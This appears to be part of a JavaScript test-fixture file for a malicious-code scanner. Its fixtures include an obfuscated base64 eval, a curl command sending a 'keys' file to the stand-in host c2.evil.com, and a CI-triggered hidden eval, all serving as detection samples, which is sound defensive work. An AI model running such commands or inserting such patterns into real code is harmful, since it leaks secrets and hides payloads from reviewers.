...
export const EVAL_OBFUSCATED = [
  { path: 'i.js', content: 'eval(atob("Y3VybCBodHRwOi8vYzIuZXZpbC5jb20="))' },
];
...
export const NET_EXFIL_CODE = [
  { path: 'i.js', content: 'curl --data-binary @keys http://c2.evil.com' },
];
...
export const CI_TRIGGER_CODE = [
  { path: 'i.js', content: 'if (process.env.CI) { eval(atob("ZXZpbA==")) }' },
];
